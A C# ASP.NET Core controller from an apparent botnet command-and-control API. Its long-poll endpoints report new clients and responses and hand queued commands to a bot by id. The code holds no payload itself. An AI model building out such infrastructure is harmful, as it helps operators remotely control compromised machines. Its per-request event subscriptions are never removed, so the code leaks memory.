using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using BotNet_API.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;

namespace BotNet_API.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class ListenController : ControllerBase
    {
        [HttpGet("clients")]
        public async Task<ActionResult<Client>> ListenClient()
        {
            return await GetClient();
        }

        private SemaphoreSlim Clientsignal = new SemaphoreSlim(0);
        public async Task<Client> GetClient()
        {
            Client client = null;
            ClientController.OnClientAdded += x => {
                client = x;
                Clientsignal.Release();
            };
            await Clientsignal.WaitAsync();
            return client;
        }

        [HttpGet("responses")]
        public async Task<ActionResult<Response>> ListenResponses()
        {
            return await GetResponse();
        }

        private SemaphoreSlim Responsesignal = new SemaphoreSlim(0);
        public async Task<Response> GetResponse()
        {
            Response response = null;
            ResponseController.OnResponseAdded += x => {
                response = x;
                Responsesignal.Release();
            };
            await Responsesignal.WaitAsync();
            return response;
        }

        [HttpGet("commands/{id}")]
        public async Task<ActionResult<string>> ListenCommands(uint id)
        {
            return (await GetCommand(id)).command;
        }

        private SemaphoreSlim Commandsignal = new SemaphoreSlim(0);
        public async Task<Command> GetCommand(uint id)
        {
            Command command = null;
            CommandController.OnCommandAdded += x => {
                if (x.Clients.Find(y => y.id == id) != null)
                {
                    command = x;
                    Commandsignal.Release();
                }
            };
            await Commandsignal.WaitAsync();
            return command;
        }
    }
}